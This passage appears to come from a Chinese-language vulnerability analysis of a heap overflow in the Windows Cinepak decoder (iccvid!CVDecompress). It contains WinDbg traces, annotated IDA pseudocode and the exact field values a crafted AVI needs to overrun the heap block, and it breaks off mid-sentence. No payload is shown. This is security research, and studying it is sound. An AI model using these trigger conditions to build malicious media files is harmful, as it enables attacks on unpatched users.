class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x11e</span>:</span><br><span class="line">73b722cc f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]            <span class="comment">; 第3次复制数据</span></span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; bd <span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; p</span><br><span class="line">(f68.ff4): Access violation - code c0000005 (first chance) &lt;---- 内存访问违例</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00006000</span> <span class="built_in">ebx</span>=<span class="number">00157638</span> <span class="built_in">ecx</span>=000001a0 <span class="built_in">edx</span>=0259fd38 <span class="built_in">esi</span>=0015d000 <span class="built_in">edi</span>=0015f000</span><br><span class="line"><span class="built_in">eip</span>=73b722cc <span class="built_in">esp</span>=0259fd04 <span class="built_in">ebp</span>=0259fd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x11e</span>:</span><br><span class="line">73b722cc f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]            <span class="comment">; 内存访问违例</span></span><br><span class="line"><span class="number">0</span>:<span class="number">014</span>&gt; !address <span class="built_in">edi</span>                       </span><br><span class="line">Failed to map Heaps (error <span class="number">80004005</span>)</span><br><span class="line"><span class="symbol">Usage:</span>                  &lt;unclassified&gt;</span><br><span class="line">Allocation Base:        <span class="number">00090000</span></span><br><span class="line">Base Address:           0015f000</span><br><span class="line">End Address:            <span class="number">00190000</span></span><br><span class="line">Region Size:            <span class="number">00031000</span></span><br><span class="line"><span class="symbol">Type:</span>                   <span class="number">00020000</span>    MEM_PRIVATE</span><br><span class="line"><span class="symbol">State:</span>                  <span class="number">00002000</span>    MEM_RESERVE <span class="comment">; 即保留内存，保留内存尚不能被实际使用，但其地址空间已被预留，尚需一个提交动作。</span></span><br><span class="line"><span class="symbol">Protect:</span>                <span class="number">00000000</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;通过上面的<code>分析过程</code>，我们可以知道总共进行了<code>3次堆块内存数据复制</code>，<code>第3次数据复制</code>过程中发生<code>内存访问违例</code>。堆块数据区域大小为<code>0x6000字节</code>，<strong><code>第1次</code></strong>堆块内存数据复制时，<strong><code>源地址</code></strong>(esi)为<code>堆块数据区域首地址</code>，<strong><code>目的地址</code></strong>(edi)为<code>堆块数据区域首地址+0x2000</code>，<strong><code>复制数据长度</code></strong>(ecx)为<code>0x800*4=0x2000字节</code>。<strong><code>第2次</code></strong>堆块内存数据复制时，<strong><code>源地址</code></strong>(esi)为<code>堆块数据区域首地址+0x2000</code>，<strong><code>目的地址</code></strong>(edi)为<code>堆块数据区域首地址+0x4000</code>，<strong><code>复制数据长度</code></strong>(ecx)为<code>0x800*4=0x2000字节</code>。<strong><code>第3次</code></strong>堆块内存数据复制时，<strong><code>源地址</code></strong>(esi)为<code>堆块数据区域首地址+0x4000</code>，<strong><code>目的地址</code></strong>(edi)为<code>堆块数据区域首地址+0x6000</code>，<strong><code>复制数据长度</code></strong>(ecx)为<code>0x800*4=0x2000字节</code>。但是<code>第3次</code>堆块内存数据复制时的<code>目的地址</code>已经超出了<code>0x6000</code>字节的<code>堆块数据区域</code>，覆盖了<code>下一个堆块</code>，造成了<code>堆溢出</code>。之后的数据复制由于对<code>内存状态</code>(State)为<code>MEM_RESERVE</code>的内存进行<code>写数据</code>，造成了<code>内存访问异常</code>。</p><h2 id="0x40-漏洞利用"><a href="#0x40-漏洞利用" class="headerlink" title="0x40 漏洞利用"></a>0x40 漏洞利用</h2><p>&emsp;&emsp;经过之前的分析，可以知道只有同时满足<code>“Strip CVID ID”</code>为<code>0x1100</code>、<code>“Frame Header”</code>中的<code>“Flags”</code>为<code>0x00</code>和<code>“Frame Header”</code>中的<code>“Number of coded strips”</code>大于1时，才进行<code>堆块内存复制</code>。当<code>“00dc”</code>视频编码数据块中的<code>“Strip CVID ID”</code>为<code>0x1100</code>的Strip的个数<code>大于等于3</code>时，就会造成<code>堆溢出</code>。通过前面对<code>CVDecompress函数</code>的功能的分析，以及<code>IDA</code>分析出的<code>CVDecompress函数</code>的<code>伪代码</code>，我们对其<code>伪代码</code>中的<code>变量</code>进行<code>重命名</code>，可以得到如下<code>更为容易理解</code>的<code>伪代码</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">stdcall <span class="title">CVDecompress</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> arg1, _BYTE *cinepak_codec_data1, <span class="keyword">unsigned</span> <span class="keyword">int</span> idx1_Len_of_CVID_data, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5, <span class="keyword">int</span> a6, <span class="keyword">int</span> a7)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> arg11; <span class="comment">// ebx</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *cinepak_codec_data11; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> Len_of_CVID_data; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 Num_of_coded_strips; <span class="comment">// ax</span></span><br><span class="line">  _BYTE *cinepak_codec_data2; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v15; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 Strips_bottom_Y_position; <span class="comment">// ax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 Strips_top_Y_position; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">int</span> Strip_Y_pixel; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> CVID_Chunk_ID_Ptr; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *CVID_Chunk_ID_Ptr1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v21; <span class="comment">// dx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> Size_of_chunk_data; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v23; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> Size_of_chunk_data1; <span class="comment">// [esp+Ch] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> Num_of_coded_strips1; <span class="comment">// [esp+10h] [ebp-1Ch]</span></span><br><span class="line">  _BYTE *cinepak_codec_data21; <span class="comment">// [esp+14h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> CVID_Chunk_ID_Ptr2; <span class="comment">// [esp+14h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> num; <span class="comment">// [esp+18h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> remain_coded_data_size; <span class="comment">// [esp+1Ch] [ebp-10h]</span></span><br><span class="line">  _BYTE *cinepak_codec_data22; <span class="comment">// [esp+20h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> Size_of_strip_data; <span class="comment">// [esp+24h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> Heap_Ptr_Offset; <span class="comment">// [esp+28h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  arg11 = arg1;</span><br><span class="line">  v8 = *(_BYTE **)(arg1 + <span class="number">36</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v8 )                                     <span class="comment">// v8 == 0x0</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = a7;</span><br><span class="line">    *(_DWORD *)(arg1 + <span class="number">36</span>) = <span class="number">0</span>;</span><br><span class="line">    CVDecompress(arg11, v8, <span class="number">0x2446</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, v9);</span><br><span class="line">    LocalFree(v8);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// idx1_Len_of_CVID_data如果小于0x20,则直接退出,idx1_Len_of_CVID_data为CVID数据长度</span></span><br><span class="line">  <span class="keyword">if</span> ( idx1_Len_of_CVID_data &gt;= <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cinepak_codec_data11 = cinepak_codec_data1; <span class="comment">// cinepak_codec_data1指针</span></span><br><span class="line">    BYTE1(result) = cinepak_codec_data1[<span class="number">1</span>];     <span class="comment">// CVID数据长度的第3个字节</span></span><br><span class="line">    LOBYTE(result) = cinepak_codec_data1[<span class="number">2</span>];    <span class="comment">// CVID数据长度的第2个字节</span></span><br><span class="line">    Len_of_CVID_data = (<span class="keyword">unsigned</span> __int8)cinepak_codec_data1[<span class="number">3</span>] | (result &lt;&lt; <span class="number">8</span>);<span class="comment">// 以大端读取CVID数据长度</span></span><br><span class="line">    <span class="comment">// idx1_Len_of_CVID_data为从“idx1”索引块中读出的数据块的数据长度,Len_of_CVID_data为从对应的数据块中读出的数据长度,这里判断它们是否相同</span></span><br><span class="line">    <span class="comment">// Frame Header-&gt;Flags</span></span><br><span class="line">    <span class="comment">// 如果Len_of_CVID_data&gt;=0xA,0xA为Frame Header的大小,则返回0,且计算出减去Frame Header的大小后,剩余的数据的大小,否则返回一个负数</span></span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)idx1_Len_of_CVID_data &lt; Len_of_CVID_data</span><br><span class="line">      || (HIBYTE(idx1_Len_of_CVID_data) = *cinepak_codec_data1,</span><br><span class="line">          ULongSub(Len_of_CVID_data, <span class="number">0xA</span>u, &amp;remain_coded_data_size) &lt; <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_33:</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      HIBYTE(Num_of_coded_strips) = cinepak_codec_data11[<span class="number">8</span>];<span class="comment">// Number of coded strips的高位字节</span></span><br><span class="line">      cinepak_codec_data2 = cinepak_codec_data11 + <span class="number">0xA</span>;<span class="comment">// cinepak_codec_data2指针</span></span><br><span class="line">      num = <span class="number">0</span>;                                  <span class="comment">// coded strip计数器</span></span><br><span class="line">      cinepak_codec_data21 = cinepak_codec_data2;<span class="comment">// cinepak_codec_data2指针</span></span><br><span class="line">      cinepak_codec_data22 = cinepak_codec_data2;<span class="comment">// cinepak_codec_data2指针</span></span><br><span class="line">      LOBYTE(Num_of_coded_strips) = *(cinepak_codec_data2 - <span class="number">1</span>);<span class="comment">// Number of coded strips的低位字节</span></span><br><span class="line">      Num_of_coded_strips1 = Num_of_coded_strips;<span class="comment">// 以大端读取Number of coded strips</span></span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)Num_of_coded_strips &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        Heap_Ptr_Offset = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 判断“00dc”数据块剩余未解码数据长度是否小于0x16</span></span><br><span class="line">          <span class="keyword">if</span> ( remain_coded_data_size &lt; <span class="number">0x16</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          HIBYTE(v15) = cinepak_codec_data2[<span class="number">1</span>]; <span class="comment">// Strip CVID ID的低位字节</span></span><br><span class="line">          LOBYTE(v15) = cinepak_codec_data2[<span class="number">2</span>]; <span class="comment">// Size of strip data的高位字节</span></span><br><span class="line">          Size_of_strip_data = (<span class="keyword">unsigned</span> __int8)cinepak_codec_data2[<span class="number">3</span>] | (v15 &lt;&lt; <span class="number">8</span>);<span class="comment">// 以大端读取Size of strip data</span></span><br><span class="line">          <span class="comment">// 判断“00dc”数据块剩余未解码数据长度是否小于Size_of_strip_data</span></span><br><span class="line">          <span class="keyword">if</span> ( remain_coded_data_size &lt; Size_of_strip_data )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="comment">// 判断Strip CVID ID的高位字节是否为0x10和0x11</span></span><br><span class="line">          <span class="keyword">if</span> ( *cinepak_codec_data2 == <span class="number">0x10</span> || *cinepak_codec_data2 == <span class="number">0x11</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="comment">// 如果Size_of_strip_data&gt;=0xC,0xC为Strip Header大小,则返回0,且计算出减去Strip Header的大小后,剩余的数据大小,否则返回一个负数</span></span><br><span class="line">            <span class="keyword">if</span> ( ULongSub(Size_of_strip_data, <span class="number">0xC</span>u, &amp;arg1) &lt; <span class="number">0</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">            HIBYTE(Strips_bottom_Y_position) = cinepak_codec_data2[<span class="number">8</span>];<span class="comment">// Strips bottom Y position的高位字节</span></span><br><span class="line">            HIBYTE(Strips_top_Y_position) = cinepak_codec_data2[<span class="number">4</span>];<span class="comment">// Strips top Y position的高位字节</span></span><br><span class="line">            LOBYTE(Strips_bottom_Y_position) = cinepak_codec_data2[<span class="number">9</span>];<span class="comment">// Strips bottom Y position的低位字节</span></span><br><span class="line">            LOBYTE(Strips_top_Y_position) = cinepak_codec_data2[<span class="number">5</span>];<span class="comment">// Strips top Y position的低位字节</span></span><br><span class="line">            Strip_Y_pixel = Strips_bottom_Y_position - Strips_top_Y_position;</span><br><span class="line">            LOWORD(Strip_Y_pixel) = *(_WORD *)(arg11 + <span class="number">46</span>) * Strip_Y_pixel;</span><br><span class="line">            cinepak_codec_data1 = (_BYTE *)Strip_Y_pixel;</span><br><span class="line">            <span class="comment">// 1、Heap_Ptr_Offset不为0</span></span><br><span class="line">            <span class="comment">// 2、Frame Header-&gt;Flags为0x00,不使用上一个条(Strips)中定义的codebooks</span></span><br><span class="line">            <span class="comment">// 3、Strip CVID ID的高位字节为0x11</span></span><br><span class="line">            <span class="comment">// 4、则进行数据复制</span></span><br><span class="line">            <span class="keyword">if</span> ( Heap_Ptr_Offset &amp;&amp; !HIBYTE(idx1_Len_of_CVID_data) &amp;&amp; *cinepak_codec_data2 == <span class="number">0x11</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">// 目的地址: 源地址+0x2000</span></span><br><span class="line">              <span class="comment">// 源地址: 0x6000大小的堆块,第1次:0x0,第2次:0x2000,第3次:0x4000(相对于堆块数据区域首地址的偏移)</span></span><br><span class="line">              <span class="comment">// 复制数据长度: 0x2000字节</span></span><br><span class="line">              qmemcpy(</span><br><span class="line">                (<span class="keyword">void</span> *)(*(_DWORD *)(arg11 + <span class="number">28</span>) + Heap_Ptr_Offset),</span><br><span class="line">                (<span class="keyword">const</span> <span class="keyword">void</span> *)(*(_DWORD *)(arg11 + <span class="number">28</span>) + Heap_Ptr_Offset - <span class="number">0x2000</span>),</span><br><span class="line">                <span class="number">0x2000</span>u);</span><br><span class="line">              cinepak_codec_data2 = cinepak_codec_data21;</span><br><span class="line">            &#125;</span><br><span class="line">            CVID_Chunk_ID_Ptr = (<span class="keyword">int</span>)(cinepak_codec_data22 + <span class="number">0xC</span>);</span><br><span class="line">            CVID_Chunk_ID_Ptr1 = cinepak_codec_data2 + <span class="number">0xC</span>;</span><br><span class="line">            *(_DWORD *)(arg11 + <span class="number">56</span>) = Heap_Ptr_Offset + *(_DWORD *)(arg11 + <span class="number">32</span>);</span><br><span class="line">            CVID_Chunk_ID_Ptr2 = (<span class="keyword">int</span>)(cinepak_codec_data2 + <span class="number">0xC</span>);</span><br><span class="line">            *(_DWORD *)(arg11 + <span class="number">60</span>) = a7;</span><br><span class="line">            <span class="comment">// 判断Size_of_strip_data减去Strip Header的大小后,剩余的数据大小是否大于等于4,也就是Chunk Data不为空</span></span><br><span class="line">            <span class="keyword">while</span> ( arg1 &gt;= <span class="number">4</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              HIBYTE(v21) = CVID_Chunk_ID_Ptr1[<span class="number">1</span>];<span class="comment">// CVID Chunk ID的低位字节</span></span><br><span class="line">              LOBYTE(v21) = CVID_Chunk_ID_Ptr1[<span class="number">2</span>];<span class="comment">// Size of chunk data的高位字节</span></span><br><span class="line">              Size_of_chunk_data = CVID_Chunk_ID_Ptr1[<span class="number">3</span>] | (v21 &lt;&lt; <span class="number">8</span>);<span class="comment">// Size of chunk data的低位字节,以大端读取Size of chunk data</span></span><br><span class="line">              Size_of_chunk_data1 = Size_of_chunk_data;</span><br><span class="line">              <span class="comment">// 判断Size_of_strip_data减去Strip Header的大小后,剩余的数据大小是否小于Size_of_chunk_data</span></span><br><span class="line">              <span class="keyword">if</span> ( arg1 &lt; Size_of_chunk_data )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">switch</span> ( *CVID_Chunk_ID_Ptr1 )    <span class="comment">// CVID Chunk ID的高位字节</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x20</span>u:                     <span class="comment">// List of blocks in 12 bit V4 codebook</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x21</span>u:                     <span class="comment">// Selective list of blocks to update 12 bit V4 codebook</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x24</span>u:                     <span class="comment">// List of blocks in 8 bit V4 codebook</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x25</span>u:                     <span class="comment">// Selective list of blocks to update 8 bit V4 codebook</span></span><br><span class="line">                  (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span>, _DWORD, _DWORD, _DWORD))arg11)(</span><br><span class="line">                    CVID_Chunk_ID_Ptr,</span><br><span class="line">                    *(_DWORD *)(arg11 + <span class="number">56</span>),</span><br><span class="line">                    *(_DWORD *)(arg11 + <span class="number">52</span>),</span><br><span class="line">                    *(_DWORD *)(arg11 + <span class="number">48</span>));   <span class="comment">// ExpandCodeBook32()</span></span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x22</span>u:                     <span class="comment">// List of blocks in 12 bit V1 codebook</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x23</span>u:                     <span class="comment">// Selective list of blocks to update 12 bit V1 codebook</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x26</span>u:                     <span class="comment">// List of blocks in 8 bit V1 codebook</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x27</span>u:                     <span class="comment">// Selective list of blocks to update 8 bit V1 codebook</span></span><br><span class="line">                  (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, _DWORD, _DWORD))(arg11 + <span class="number">4</span>))(</span><br><span class="line">                    CVID_Chunk_ID_Ptr,</span><br><span class="line">                    *(_DWORD *)(arg11 + <span class="number">56</span>) + <span class="number">0x1000</span>,</span><br><span class="line">                    *(_DWORD *)(arg11 + <span class="number">52</span>),</span><br><span class="line">                    *(_DWORD *)(arg11 + <span class="number">48</span>));   <span class="comment">// ExpandCodeBook32()</span></span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x30</span>u:                     <span class="comment">// Vectors used to encode a frame</span></span><br><span class="line">                  (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, _BYTE *))(arg11 + <span class="number">8</span>))(</span><br><span class="line">                    arg11,</span><br><span class="line">                    CVID_Chunk_ID_Ptr + <span class="number">4</span>,</span><br><span class="line">                    Size_of_chunk_data - <span class="number">4</span>,</span><br><span class="line">                    a4,</span><br><span class="line">                    a5,</span><br><span class="line">                    a6,</span><br><span class="line">                    cinepak_codec_data1);       <span class="comment">// DrawKey32()</span></span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x31</span>u:                     <span class="comment">// Selective set of vectors used to encode a frame</span></span><br><span class="line">                  (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, _BYTE *))(arg11 + <span class="number">16</span>))(</span><br><span class="line">                    arg11,</span><br><span class="line">                    CVID_Chunk_ID_Ptr + <span class="number">4</span>,</span><br><span class="line">                    Size_of_chunk_data - <span class="number">4</span>,</span><br><span class="line">                    a4,</span><br><span class="line">                    a5,</span><br><span class="line">                    a6,</span><br><span class="line">                    cinepak_codec_data1);       <span class="comment">// DrawInter32()</span></span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x32</span>u:                     <span class="comment">// List of blocks from only the V1 codebook</span></span><br><span class="line">                  (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, _BYTE *))(arg11 + <span class="number">12</span>))(</span><br><span class="line">                    arg11,</span><br><span class="line">                    CVID_Chunk_ID_Ptr + <span class="number">4</span>,</span><br><span class="line">                    Size_of_chunk_data - <span class="number">4</span>,</span><br><span class="line">                    a4,</span><br><span class="line">                    a5,</span><br><span class="line">                    a6,</span><br><span class="line">                    cinepak_codec_data1);       <span class="comment">// DrawSmooth32()</span></span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              CVID_Chunk_ID_Ptr1 = (<span class="keyword">unsigned</span> __int8 *)(Size_of_chunk_data1 + CVID_Chunk_ID_Ptr2);</span><br><span class="line">              v23 = <span class="number">1</span>;</span><br><span class="line">              CVID_Chunk_ID_Ptr += Size_of_chunk_data1;</span><br><span class="line">              CVID_Chunk_ID_Ptr2 += Size_of_chunk_data1;</span><br><span class="line">              <span class="keyword">if</span> ( Size_of_chunk_data1 &gt; <span class="number">1</span> )</span><br><span class="line">                v23 = Size_of_chunk_data1;</span><br><span class="line">              <span class="comment">// Size_of_strip_data减去Strip Header的大小后,剩余的数据大小再减去Size_of_chunk_data(1个Strip可以包含多个CVID Chunk)</span></span><br><span class="line">              arg1 -= v23;</span><br><span class="line">            &#125;</span><br><span class="line">            a6 += a7 * (<span class="keyword">signed</span> __int16)cinepak_codec_data1;</span><br><span class="line">            ++num;                              <span class="comment">// coded strip计数器</span></span><br><span class="line">            Heap_Ptr_Offset += <span class="number">0x2000</span>;          <span class="comment">// 堆数据区指针偏移+0x2000</span></span><br><span class="line">          &#125;</span><br><span class="line">          cinepak_codec_data22 += Size_of_strip_data;<span class="comment">// 指向下一个Strip Header</span></span><br><span class="line">          remain_coded_data_size -= Size_of_strip_data;<span class="comment">// “00dc”数据块剩余未解码数据长度</span></span><br><span class="line">          cinepak_codec_data2 += Size_of_strip_data;<span class="comment">// 指向下一个Strip Header</span></span><br><span class="line">          cinepak_codec_data21 = cinepak_codec_data2;<span class="comment">// 指向下一个Strip Header</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( num &lt; Num_of_coded_strips1 );</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;一个正常的使用<code>Cinepak视频编解码器</code>对视频数据编码的<code>样本</code>，可以在<a 